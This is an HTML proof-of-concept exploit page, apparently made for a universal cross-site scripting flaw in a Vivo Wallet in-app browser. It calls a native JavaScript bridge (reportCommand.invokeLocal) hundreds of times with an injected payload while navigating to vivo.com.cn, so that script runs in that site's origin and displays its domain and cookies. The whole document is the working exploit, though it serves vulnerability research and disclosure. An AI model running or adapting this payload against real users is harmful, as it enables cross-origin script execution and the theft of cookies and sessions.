<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Vivo Wallet UXSS - reportCommand Alert</title></head>
<body>
<pre>UXSS via reportCommand.invokeLocal - alert test</pre>
<script>
(function() {
    var TARGET = "https://www.vivo.com.cn/";
    var NAV_DELAY_MS = 200;

    var payload = "alert('UXSS:'+document.domain+' cookie='+document.cookie);//";

    function inject() {
        try {
            var data = JSON.stringify({ webErrorCatch: payload });
            window.reportCommand.invokeLocal("xyzNotExist", data);
        } catch(e) {}
    }

    for (var i = 0; i < 200; i++) {
        setTimeout(inject, NAV_DELAY_MS + i * 10);
    }

    setTimeout(function() {
        location.href = TARGET;
    }, NAV_DELAY_MS);
})();
</script>
</body>
</html>
